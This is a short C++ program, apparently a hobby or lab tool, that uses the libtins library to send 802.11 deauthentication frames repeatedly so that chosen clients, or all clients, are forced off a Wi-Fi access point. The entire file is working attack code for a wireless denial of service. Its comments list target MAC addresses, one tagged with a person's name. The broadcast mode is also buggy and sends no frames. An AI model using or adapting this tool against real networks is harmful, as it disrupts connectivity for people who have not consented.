#include <iostream>
#include <string.h>
#include <tins/tins.h>
#include <unistd.h>
#include <vector>
using namespace Tins;
using namespace std;


// first : interface / second : AP / Third~ station
int main(int argc, char * argv[])
{
    vector<string> station;
    vector<string> ap;
    if(argc>=4)     // diconnect specific station in ap
    {
        ap.push_back(argv[2]);
        for(int i=3;i<argc;i++)
            station.push_back(argv[i]);
    }
    else if(argc==3)    // diconnect all station in ap
    {
        ap.push_back(argv[2]);
        station.push_back("FF:FF:FF:FF:FF:FF");
    }
    else
    {
        printf("usage <interface> <bssid> <ap> \n <interface> <bssid> <ap> <station>\n");
        exit(0);
    }
    RadioTap radio[argc-3];
    Dot11Deauthentication Deauth[argc-3];
    PacketSender sender;
    for(int i=0;i<argc-3;i++)
    {
        Deauth[i].addr1(station[i]); // Station
        Deauth[i].addr2(ap[0]);      // Ap
        Deauth[i].addr3(ap[0]);   // BSSID;
        radio[i].inner_pdu(Deauth[i]);
    }

    while(1)
    {
        for(int i=0;i<argc-3;i++)
         sender.send(radio[i],argv[1]);
        sleep(3);
    }

    // "00:24:a5:ea:c4:fa" my test ap
    // "C4:88:E5:0B:16:E4" my test station
    // 90:9F:33:9A:47:36 Bob Mill
}
